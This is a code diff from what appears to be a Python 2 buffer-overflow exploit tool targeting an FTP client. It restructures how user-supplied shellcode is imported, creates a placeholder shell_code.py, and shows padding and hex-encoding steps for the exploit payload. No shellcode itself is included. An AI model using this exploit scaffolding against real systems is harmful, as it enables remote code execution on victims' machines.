@@ -6,7 +6,6 @@ import string
 import socket 
 import time
 import readline
-from shell_code import shell_code 
 from Banner import Banner
 import shutil
 import fileinput
@@ -29,7 +28,9 @@ class SERVER_BUFFER():
              global O
              global B
              global P
-             global Y  
+             global Y 
+	     with open('shell_code.py','w') as shell_code:
+                 shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')
              mode = """
                        ========================                          
                          Target FTP Clinet
@@ -175,6 +176,7 @@ class SERVER_BUFFER():
                 from Bad_Character import Bad_Character_Clinet             
                 run = Bad_Character_Clinet()
             elif bad_op ==Bad_no and len(Bad_no)==2: 
+		print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                 pass
             else:
               print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
@@ -206,7 +208,7 @@ class SERVER_BUFFER():
                     exit()
                               
       def attack(self):
-            
+             from shell_code import shell_code 
 	     try:
 	       
                  Start_string = self.location*"A"        
@@ -236,7 +238,7 @@ class SERVER_BUFFER():
                    Banner  
                    exit()                
       def auto_write(self): 
-              
+                from shell_code import shell_code 
                 try:                
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
